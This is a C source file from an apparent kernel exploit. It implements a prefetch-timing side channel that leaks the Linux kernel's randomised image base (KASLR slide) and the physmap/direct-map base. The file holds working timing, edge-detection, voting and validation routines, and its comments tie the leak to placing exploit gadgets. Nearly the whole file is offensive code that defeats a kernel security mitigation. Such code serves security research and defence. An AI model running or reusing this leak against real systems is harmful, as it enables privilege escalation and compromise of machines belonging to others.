/*
 * Copyright 2026 Nebula Security
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "leak.h"

#define KASLR_START 0xffffffff81000000ULL
#define KASLR_END (KASLR_START + 0x40000000ULL)
#define KASLR_SLOT_SIZE 0x200000ULL

#define PHYSMAP_START 0xffff888000000000ULL
#define PHYSMAP_END 0xffffa48000000000ULL
#define PHYSMAP_SLOT_SIZE 0x40000000ULL
#define PHYSMAP_PROBE_OFFSET 0x10000000ULL

static inline uint64_t rdtsc_begin(void)
{
	uint32_t lo, hi;

	asm volatile("mfence; rdtscp; lfence"
		     : "=a"(lo), "=d"(hi) : : "rcx", "memory");
	return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t rdtsc_end(void)
{
	uint32_t lo, hi;

	asm volatile("lfence; rdtscp; mfence"
		     : "=a"(lo), "=d"(hi) : : "rcx", "memory");
	return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t prefetch_time(uint64_t address)
{
	uint64_t before = rdtsc_begin();

	asm volatile("prefetchnta (%0); prefetcht2 (%0)"
		     : : "r"(address) : "memory");
	return rdtsc_end() - before;
}

static int compare_u64(const void *left, const void *right)
{
	uint64_t a = *(const uint64_t *)left;
	uint64_t b = *(const uint64_t *)right;

	return (a > b) - (a < b);
}

static uint64_t median_copy(const uint64_t *values, size_t count)
{
	uint64_t *copy = malloc(count * sizeof(*copy));
	uint64_t result;

	if (!copy) {
		perror("malloc leak median");
		exit(1);
	}
	memcpy(copy, values, count * sizeof(*copy));
	qsort(copy, count, sizeof(*copy), compare_u64);
	result = copy[count / 2];
	free(copy);
	return result;
}

static size_t find_edge(const uint64_t *timings, size_t count,
			size_t window)
{
	uint64_t median = median_copy(timings, count);
	uint64_t current = 0;
	uint64_t best;
	size_t best_slot = 0;

	if (!window || count < window) {
		fprintf(stderr, "invalid prefetch window\n");
		exit(1);
	}
	for (size_t i = 0; i < window; i++)
		current += timings[i] > median ? timings[i] - median :
						   median - timings[i];
	best = current;
	for (size_t i = 1; i <= count - window; i++) {
		uint64_t old = timings[i - 1];
		uint64_t add = timings[i + window - 1];

		current -= old > median ? old - median : median - old;
		current += add > median ? add - median : median - add;
		if (current > best) {
			best = current;
			best_slot = i;
		}
	}
	return best_slot;
}

static uint64_t image_trial(int map_pages)
{
	const size_t count = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
	uint64_t *timings = malloc(count * sizeof(*timings));
	uint64_t *mapped_diffs;
	uint64_t median;
	size_t edge;
	uint64_t result;

	if (!timings) {
		perror("malloc KASLR timings");
		exit(1);
	}
	for (size_t i = 0; i < count; i++)
		timings[i] = UINT64_MAX;
	for (int sample = 0; sample < 100; sample++) {
		for (size_t i = 0; i < count; i++) {
			uint64_t value = prefetch_time(KASLR_START +
						       i * KASLR_SLOT_SIZE);

			if (value < timings[i])
				timings[i] = value;
		}
	}
	edge = find_edge(timings, count, map_pages);
	/*
	 * Ordinarily the strongest timing window begins one slot after _text:
	 * the _text slot is mapped but has a weaker, high-latency signature.
	 * Occasionally that weaker slot itself wins the edge search.  An
	 * unconditional edge-- then puts every gadget 2 MiB too low.  Tell the
	 * two cases apart by testing whether the slot immediately before the
	 * edge has a material mapped-page deviation from the global median.
	 */
	median = median_copy(timings, count);
	mapped_diffs = malloc((size_t)map_pages * sizeof(*mapped_diffs));
	if (!mapped_diffs) {
		perror("malloc KASLR edge check");
		exit(1);
	}
	for (int i = 0; i < map_pages; i++) {
		uint64_t value = timings[edge + (size_t)i];

		mapped_diffs[i] = value > median ? value - median :
						       median - value;
	}
	if (edge) {
		uint64_t value = timings[edge - 1];
		uint64_t prior_diff = value > median ? value - median :
							median - value;
		uint64_t mapped_diff = median_copy(mapped_diffs, map_pages);

		if (prior_diff * 3 >= mapped_diff)
			edge--;
	}
	free(mapped_diffs);
	result = KASLR_START + edge * KASLR_SLOT_SIZE;
	free(timings);
	return result;
}

uint64_t leak_image_slide(int map_pages)
{
	for (int round = 0; round < 5; round++) {
		uint64_t candidate[3];

		for (int i = 0; i < 3; i++)
			candidate[i] = image_trial(map_pages);
		for (int i = 0; i < 3; i++) {
			int votes = 0;

			for (int j = 0; j < 3; j++)
				votes += candidate[i] == candidate[j];
			if (votes >= 2) {
				printf("[!] Leaked KASLR base: 0x%llx\n",
				       (unsigned long long)candidate[i]);
				printf("[!] KASLR slide: 0x%llx\n",
				       (unsigned long long)(candidate[i] -
							KASLR_START));
				return candidate[i] - KASLR_START;
			}
		}
	}
	fprintf(stderr, "failed to leak KASLR base\n");
	exit(1);
}

static uint64_t physmap_trial(void)
{
	const size_t count = (PHYSMAP_END - PHYSMAP_START) / PHYSMAP_SLOT_SIZE;
	uint64_t *timings = malloc(count * sizeof(*timings));
	uint64_t result;

	if (!timings) {
		perror("malloc physmap timings");
		exit(1);
	}
	for (size_t i = 0; i < count; i++)
		timings[i] = UINT64_MAX;
	for (int sample = 0; sample < 20; sample++) {
		for (size_t i = 0; i < count; i++) {
			uint64_t address = PHYSMAP_START + i * PHYSMAP_SLOT_SIZE +
					   PHYSMAP_PROBE_OFFSET;
			uint64_t value = prefetch_time(address);

			if (value < timings[i])
				timings[i] = value;
		}
	}
	/*
	 * The maximum three-slot edge window starts two 1-GiB slots below
	 * page_offset_base on the stock Debian layout.  Returning that window
	 * start was the old helper's systematic -2 GiB bias.  The third slot is
	 * the actual randomized direct-map base (verified against page_offset_base
	 * across fresh diagnostic boots; the exploit itself uses no privileged
	 * oracle).
	 */
	result = PHYSMAP_START + (find_edge(timings, count, 3) + 2) *
		 PHYSMAP_SLOT_SIZE;
	free(timings);
	return result;
}

uint64_t leak_phys_map_base_stable(int unused_map_pages)
{
	uint64_t candidate[3];

	(void)unused_map_pages;
	for (int round = 0; round < 5; round++) {
		for (int i = 0; i < 3; i++)
			candidate[i] = physmap_trial();
		for (int i = 0; i < 3; i++) {
			int votes = 0;

			for (int j = 0; j < 3; j++)
				votes += candidate[i] == candidate[j];
			if (votes >= 2) {
				printf("[!] Leaked phys map base: 0x%llx\n",
				       (unsigned long long)candidate[i]);
				return candidate[i];
			}
		}
	}
	fprintf(stderr, "failed to leak physmap base\n");
	exit(1);
}

uint64_t leak_phys_map_base_checked(uint64_t physical_probe)
{
	enum { CANDIDATES = 7, POINTS = 5, ROUNDS = 15, SAMPLES = 63 };
	static unsigned int retry_depth;
	uint64_t rough = leak_phys_map_base_stable(0);
	uint64_t candidates[CANDIDATES];
	uint64_t deviation_rounds[CANDIDATES][ROUNDS];
	uint64_t scores[CANDIDATES];
	uint64_t best_score = 0;
	uint64_t best = rough;
	const uint64_t probes[] = {
		0x200000, 0x10000000, 0x20000000, 0x30000000,
		physical_probe,
	};

	/* The edge detector can lock onto an adjacent alias of the three-slot
	 * direct-map window.  Only the real base maps this physical address, so
	 * check the rough result and its neighbouring 1-GiB slots directly.
	 * Mapped-prefetch latency can be either above or below the unmapped
	 * baseline on this CPU.  Score absolute per-probe deviations instead of
	 * incorrectly assuming that the mapped candidate is always the fastest. */
	for (int candidate = 0; candidate < CANDIDATES; candidate++)
		candidates[candidate] = rough +
			(int64_t)(candidate - 4) * PHYSMAP_SLOT_SIZE;
	for (int round = 0; round < ROUNDS; round++) {
		uint64_t raw[CANDIDATES][POINTS];

		for (int candidate = 0; candidate < CANDIDATES; candidate++) {
			for (int point = 0; point < POINTS; point++) {
				uint64_t timings[SAMPLES];

				for (int sample = 0; sample < SAMPLES; sample++)
					timings[sample] = prefetch_time(
						candidates[candidate] + probes[point]);
				raw[candidate][point] = median_copy(timings,
								      SAMPLES);
			}
		}
		for (int candidate = 0; candidate < CANDIDATES; candidate++) {
			uint64_t deviation = 0;

			for (int point = 0; point < POINTS; point++) {
				uint64_t values[CANDIDATES];
				uint64_t baseline;

				for (int i = 0; i < CANDIDATES; i++)
					values[i] = raw[i][point];
				baseline = median_copy(values, CANDIDATES);
				deviation += raw[candidate][point] > baseline ?
					raw[candidate][point] - baseline :
					baseline - raw[candidate][point];
			}
			deviation_rounds[candidate][round] = deviation;
		}
	}
	for (int candidate = 0; candidate < CANDIDATES; candidate++) {
		scores[candidate] = median_copy(deviation_rounds[candidate],
						ROUNDS);
		printf("[.] physmap check candidate=%#llx deviation=%llu\n",
		       (unsigned long long)candidates[candidate],
		       (unsigned long long)scores[candidate]);
		if (scores[candidate] > best_score) {
			best_score = scores[candidate];
			best = candidates[candidate];
		}
	}
	{
		int winners = 0;

		for (int candidate = 0; candidate < CANDIDATES; candidate++)
			winners += scores[candidate] == best_score;
		if (!best_score || winners != 1) {
			fprintf(stderr, "ambiguous physmap check "
				"(score=%llu winners=%d)\n",
				(unsigned long long)best_score, winners);
			if (retry_depth++ < 2) {
				puts("[.] retrying physmap leak");
				return leak_phys_map_base_checked(physical_probe);
			}
			retry_depth = 0;
			exit(1);
		}
	}
	retry_depth = 0;
	printf("[!] Checked phys map base: 0x%llx\n",
	       (unsigned long long)best);
	return best;
}
